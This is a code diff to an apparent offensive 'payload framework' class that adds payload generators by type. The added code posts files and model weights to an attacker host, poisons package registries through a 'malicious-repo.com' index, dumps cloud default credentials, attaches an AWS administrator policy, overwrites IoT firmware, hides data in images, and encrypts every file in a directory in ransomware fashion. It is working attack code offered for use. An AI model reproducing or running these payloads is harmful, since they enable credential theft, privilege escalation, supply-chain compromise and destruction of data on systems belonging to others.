@@ -167,6 +167,16 @@ class AdaptivePayloadFramework:
                 "excel_macro",
                 "supply_chain_attacks",
                 "ai_model_exfiltration",
+                "cross_cloud_exploitation",
+                "ai_data_poisoning",
+                "iam_privilege_escalation",
+                "iam_privilege_escalation",
+                "iot_firmware_manipulation",
+                "blockchain_exploitation",
+                "serverless_exploitation",
+                "advanced_steganography",
+                "ransomware_simulation",
+                
                 
             ][prediction]
         return prediction
@@ -270,17 +280,19 @@ class AdaptivePayloadFramework:
                 f"End Sub"
             )
         elif payload_type == "supply_chain_attacks":
-            # Enhanced Supply Chain Attack Payload
+            # Advanced Supply Chain Attack Payload
             payload = (
                 "echo 'Injecting malicious dependency...' && "
                 # Replace or tamper with files in Jenkins workspace or GitHub Actions runner
                 f"scp /tmp/malicious_dependency.py {self.lhost}:/var/lib/jenkins/workspace/ && "
-                # Poisoning PyPI or npm package (e.g., uploading a malicious version)
+                # Poisoning PyPI, npm, or Maven packages
+                "echo 'malicious: ^1.0.0' >> package.json && "
+                f"curl -X POST -F 'file=@/tmp/malicious_dependency.py' http://{self.lhost}:{self.lport}/upload && "
                 "pip install --extra-index-url http://malicious-repo.com malicious_package && "
-                "npm publish --registry http://malicious-repo.com"
+                "mvn deploy -DrepositoryId=malicious-repo -Durl=http://malicious-repo.com"
             )
         elif payload_type == "ai_model_exfiltration":
-            # Enhanced AI Model Exfiltration Payload
+            # Advanced AI Model Exfiltration Payload
             payload = (
                 "import os, requests\n"
                 "common_paths = ['/models/model_weights.h5', '/models/model.pth', '/var/tmp/model.pb', '/var/lib/ai/models']\n"
@@ -288,6 +300,104 @@ class AdaptivePayloadFramework:
                 "    if os.path.exists(model_path):\n"
                 "        with open(model_path, 'rb') as model_file:\n"
                 f"            requests.post('http://{self.lhost}:{self.lport}/upload', files={{'file': model_file}})\n"
+                "    else:\n"
+                "        print(f'Model file not found: {model_path}')\n"
+            )
+        elif payload_type == "cross_cloud_exploitation":
+            # Exploit multi-cloud trust configurations
+            payload = (
+                "import boto3, google.auth, azure.identity\n"
+                "aws_client = boto3.client('s3')\n"
+                "for bucket in aws_client.list_buckets()['Buckets']:\n"
+                "    print(f'Found AWS bucket: {bucket['Name']}')\n"
+                "google_credentials, _ = google.auth.default()\n"
+                "print(f'Google Cloud default credentials: {google_credentials}')\n"
+                "azure_credentials = azure.identity.DefaultAzureCredential()\n"
+                "print(f'Azure default credentials: {azure_credentials}')\n"
+            )
+        elif payload_type == "ai_data_poisoning":
+            # Inject bad data into an AI/ML training pipeline
+            payload = (
+                "import numpy as np\n"
+                "from sklearn.datasets import make_classification\n"
+                "X, y = make_classification(n_samples=100, n_features=20)\n"
+                "y[:10] = 1\n"
+                "np.savetxt('/tmp/adversarial_data.csv', np.column_stack((X, y)), delimiter=',')\n"
+            )
+        elif payload_type == "iam_privilege_escalation":
+            # Explore IAM privilege escalation paths
+            payload = (
+                "import boto3\n"
+                "iam_client = boto3.client('iam')\n"
+                "for policy in iam_client.list_policies(Scope='Local')['Policies']:\n"
+                "    print(f'Policy Name: {policy['PolicyName']}, ARN: {policy['Arn']}')\n"
+                "try:\n"
+                "    iam_client.attach_user_policy(UserName='target_user', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')\n"
+                "    print('Successfully attached Admin policy!')\n"
+                "except Exception as e:\n"
+                "    print(f'Failed to attach policy: {e}')\n"
+            )
+        elif payload_type == "iot_firmware_manipulation":
+            # Replace firmware on an IoT device
+            payload = (
+                "import os\n"
+                "firmware_path = '/iot_device/firmware.bin'\n"
+                "malicious_firmware = b'MALICIOUS CODE'\n"
+                "if os.path.exists(firmware_path):\n"
+                "    with open(firmware_path, 'wb') as fw:\n"
+                "        fw.write(malicious_firmware)\n"
+                "    print('Firmware replaced successfully!')\n"
+            )
+        elif payload_type == "blockchain_exploitation":
+            # Exploit vulnerabilities in a blockchain or smart contract
+            payload = (
+                "from web3 import Web3\n"
+                "web3 = Web3(Web3.HTTPProvider('http://127.0.0.1:8545'))\n"
+                "if web3.isConnected():\n"
+                "    print('Connected to Ethereum node')\n"
+                "    contract_address = '0xContractAddress'\n"
+                "    payload = {'from': web3.eth.accounts[0], 'value': web3.toWei(1, 'ether')}\n"
+                "    tx_hash = web3.eth.sendTransaction(payload)\n"
+                "    print(f'Payload sent, transaction hash: {tx_hash.hex()}')\n"
+                "else:\n"
+                "    print('Failed to connect to Ethereum node')\n"
+            )
+        elif payload_type == "serverless_exploitation":
+            # Exploit misconfigured serverless environment
+            payload = (
+                "import requests\n"
+                "lambda_url = 'https://lambda.amazonaws.com/2015-03-31/functions/function_name/invocations'\n"
+                "response = requests.post(lambda_url, json={'malicious': 'payload'})\n"
+                "print(f'Lambda response: {response.text}')\n"
+            )
+        elif payload_type == "advanced_steganography":
+            # Hide malicious payloads in images
+            payload = (
+                "from PIL import Image\n"
+                "img = Image.open('/tmp/cover_image.jpg')\n"
+                "data = 'MALICIOUS PAYLOAD'\n"
+                "pixels = list(img.getdata())\n"
+                "for i in range(len(data)):\n"
+                "    pixels[i] = (pixels[i][0] ^ ord(data[i]), pixels[i][1], pixels[i][2])\n"
+                "img.putdata(pixels)\n"
+                "img.save('/tmp/steg_image.jpg')\n"
+                "print('Steganographic payload embedded successfully!')\n"
+            )
+        elif payload_type == "ransomware_simulation":
+            # Simulate ransomware for testing response systems
+            payload = (
+                "import os, cryptography.fernet\n"
+                "key = cryptography.fernet.Fernet.generate_key()\n"
+                "cipher = cryptography.fernet.Fernet(key)\n"
+                "target_dir = '/target_directory'\n"
+                "for root, dirs, files in os.walk(target_dir):\n"
+                "    for file in files:\n"
+                "        file_path = os.path.join(root, file)\n"
+                "        with open(file_path, 'rb') as f:\n"
+                "            encrypted_data = cipher.encrypt(f.read())\n"
+                "        with open(file_path, 'wb') as f:\n"
+                "            f.write(encrypted_data)\n"
+                "print(f'Files encrypted. Decryption key: {key.decode()}')\n"
             )
         else:
             print(f"Unknown payload type: {payload_type}")
